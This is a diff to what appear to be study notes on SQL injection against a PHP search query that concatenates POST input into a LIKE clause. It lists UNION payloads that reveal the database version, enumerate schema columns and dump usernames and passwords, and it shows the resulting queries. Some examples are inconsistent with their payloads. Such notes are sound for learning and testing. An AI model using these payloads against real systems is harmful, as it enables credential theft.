@@ -92,14 +92,15 @@ $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'"
 Injection:
 ```
 ' order by 1,2,3 -- //
-' union select database(), user(), @@version, null, null -- //
+%' union select database(), user(), @@version, null, null -- //
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ' union select null, username, password, description, null from users -- //
 ```
 gives:
 ```
-SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
-SELECT * from customers WHERE name LIKE '' union select database(), user(), @@version, null, null -- //'";
+SELECT * from customers WHERE name LIKE '%' order by 1,2,3 -- //'";
+SELECT * from customers WHERE name LIKE '%' union select database(), user(), @@version, null, null -- //'";
+SELECT * from customers WHERE name LIKE '' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ```
 The `order by` injection retrieves the table size.
 
